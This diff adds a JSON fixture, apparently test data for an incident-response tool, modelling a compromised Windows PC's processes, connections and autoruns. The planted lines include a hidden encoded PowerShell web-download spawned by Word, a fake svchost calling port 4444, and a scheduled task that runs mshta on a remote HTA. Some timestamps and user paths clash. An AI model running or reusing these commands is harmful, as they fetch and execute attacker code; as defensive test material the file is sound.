@@ -1,0 +1,219 @@
+{
+  "schema": 1,
+  "host": "PC-CONTABILIDAD",
+  "user": "admin.ti",
+  "admin": true,
+  "collected": "2026-11-22T10:00:00",
+  "processes": [
+    {
+      "pid": 600,
+      "ppid": 500,
+      "name": "wininit.exe",
+      "exe": "C:\\Windows\\System32\\wininit.exe",
+      "cmdline": "wininit.exe",
+      "created": "2026-11-22T08:00:01",
+      "exe_missing": false
+    },
+    {
+      "pid": 700,
+      "ppid": 600,
+      "name": "services.exe",
+      "exe": "C:\\Windows\\System32\\services.exe",
+      "cmdline": "C:\\Windows\\System32\\services.exe",
+      "created": "2026-11-22T08:00:02",
+      "exe_missing": false
+    },
+    {
+      "pid": 1036,
+      "ppid": 700,
+      "name": "svchost.exe",
+      "exe": "C:\\Windows\\System32\\svchost.exe",
+      "cmdline": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+      "created": "2026-11-22T08:00:05",
+      "exe_missing": false
+    },
+    {
+      "pid": 1888,
+      "ppid": 1700,
+      "name": "explorer.exe",
+      "exe": "C:\\Windows\\explorer.exe",
+      "cmdline": "C:\\Windows\\Explorer.EXE",
+      "created": "2026-11-22T08:01:10",
+      "exe_missing": false
+    },
+    {
+      "pid": 4120,
+      "ppid": 1888,
+      "name": "syncsvc.exe",
+      "exe": "C:\\Users\\usuario\\AppData\\Roaming\\OneSync\\syncsvc.exe",
+      "cmdline": "\"C:\\Users\\usuario\\AppData\\Roaming\\OneSync\\syncsvc.exe\" /silent",
+      "created": "2026-11-22T08:01:20",
+      "exe_missing": false
+    },
+    {
+      "pid": 6604,
+      "ppid": 1888,
+      "name": "upd.exe",
+      "exe": "C:\\Users\\usuario\\AppData\\Local\\Temp\\upd.exe",
+      "cmdline": "C:\\Users\\usuario\\AppData\\Local\\Temp\\upd.exe",
+      "created": "2026-11-22T09:12:00",
+      "exe_missing": false
+    },
+    {
+      "pid": 5120,
+      "ppid": 1888,
+      "name": "winword.exe",
+      "exe": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "cmdline": "\"WINWORD.EXE\" /n \"C:\\Users\\usuario\\Downloads\\pedido.docm\"",
+      "created": "2026-11-22T10:30:00",
+      "exe_missing": false
+    },
+    {
+      "pid": 5300,
+      "ppid": 5120,
+      "name": "powershell.exe",
+      "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "cmdline": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+      "created": "2026-11-22T10:30:04",
+      "exe_missing": false
+    },
+    {
+      "pid": 7720,
+      "ppid": 1888,
+      "name": "svchost.exe",
+      "exe": "C:\\Users\\usuario\\AppData\\Local\\Microsoft\\svchost.exe",
+      "cmdline": "C:\\Users\\usuario\\AppData\\Local\\Microsoft\\svchost.exe",
+      "created": "2026-11-22T10:31:00",
+      "exe_missing": false
+    },
+    {
+      "pid": 2210,
+      "ppid": 700,
+      "name": "updater.exe",
+      "exe": "C:\\Program Files (x86)\\Google\\GoogleUpdater\\updater.exe",
+      "cmdline": "updater.exe --system",
+      "created": "2026-11-22T08:02:00",
+      "exe_missing": false
+    }
+  ],
+  "connections": [
+    {
+      "protocol": "TCP",
+      "process": "syncsvc.exe",
+      "pid": "4120",
+      "state": "ESTABLISHED",
+      "local": "192.168.1.34:51522",
+      "remote": "185.220.101.7:443"
+    },
+    {
+      "protocol": "TCP",
+      "process": "syncsvc.exe",
+      "pid": "4120",
+      "state": "ESTABLISHED",
+      "local": "192.168.1.34:51530",
+      "remote": "185.220.101.7:8443"
+    },
+    {
+      "protocol": "TCP",
+      "process": "upd.exe",
+      "pid": "6604",
+      "state": "ESTABLISHED",
+      "local": "192.168.1.34:51601",
+      "remote": "203.0.113.50:80"
+    },
+    {
+      "protocol": "TCP",
+      "process": "powershell.exe",
+      "pid": "5300",
+      "state": "ESTABLISHED",
+      "local": "192.168.1.34:51700",
+      "remote": "198.51.100.23:443"
+    },
+    {
+      "protocol": "TCP",
+      "process": "svchost.exe",
+      "pid": "7720",
+      "state": "ESTABLISHED",
+      "local": "192.168.1.34:51710",
+      "remote": "198.51.100.23:4444"
+    },
+    {
+      "protocol": "TCP",
+      "process": "updater.exe",
+      "pid": "2210",
+      "state": "ESTABLISHED",
+      "local": "192.168.1.34:51200",
+      "remote": "142.250.184.14:443"
+    },
+    {
+      "protocol": "TCP",
+      "process": "svchost.exe",
+      "pid": "1036",
+      "state": "ESTABLISHED",
+      "local": "192.168.1.34:50120",
+      "remote": "20.42.65.92:443"
+    }
+  ],
+  "autoruns": [
+    {
+      "name": "OneDrive",
+      "path": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe",
+      "cmdline": "\"C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe\" /background",
+      "category": "Logon",
+      "location": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "signer": "(Verified) Microsoft Corporation",
+      "sha256": "",
+      "created": "2025-01-10T09:00:00"
+    },
+    {
+      "name": "OneSyncHelper",
+      "path": "C:\\Users\\ana\\AppData\\Roaming\\OneSync\\syncsvc.exe",
+      "cmdline": "\"C:\\Users\\ana\\AppData\\Roaming\\OneSync\\syncsvc.exe\" /silent",
+      "category": "Logon",
+      "location": "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "signer": "",
+      "sha256": "196c23750e800642e7c008dc0416536449f295069c8161c23283c86334f8d251",
+      "created": "2026-11-21T22:12:00"
+    },
+    {
+      "name": "WinSysHelper",
+      "path": "C:\\Windows\\System32\\cmd.exe",
+      "cmdline": "%COMSPEC% /b /c start /b /min powershell -nop -w hidden -enc SQBFAFgA",
+      "category": "Services",
+      "location": "HKLM\\System\\CurrentControlSet\\Services",
+      "signer": "(Verified) Microsoft Windows",
+      "sha256": "",
+      "created": ""
+    },
+    {
+      "name": "Spooler",
+      "path": "C:\\Windows\\System32\\spoolsv.exe",
+      "cmdline": "C:\\Windows\\System32\\spoolsv.exe",
+      "category": "Services",
+      "location": "HKLM\\System\\CurrentControlSet\\Services",
+      "signer": "(Verified) Microsoft Windows",
+      "sha256": "",
+      "created": ""
+    },
+    {
+      "name": "\\UpdaterCheck",
+      "path": "C:\\Windows\\System32\\mshta.exe",
+      "cmdline": "mshta.exe http://203.0.113.50/u.hta",
+      "category": "Tasks",
+      "location": "Task Scheduler",
+      "signer": "(Verified) Microsoft Windows",
+      "sha256": "",
+      "created": ""
+    },
+    {
+      "name": "Zoom",
+      "path": "C:\\Program Files\\Zoom\\bin\\Zoom.exe",
+      "cmdline": "\"C:\\Program Files\\Zoom\\bin\\Zoom.exe\" --autostart",
+      "category": "Logon",
+      "location": "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+      "signer": "(Verified) Zoom Video Communications, Inc.",
+      "sha256": "",
+      "created": "2025-05-01T08:00:00"
+    }
+  ]
+}
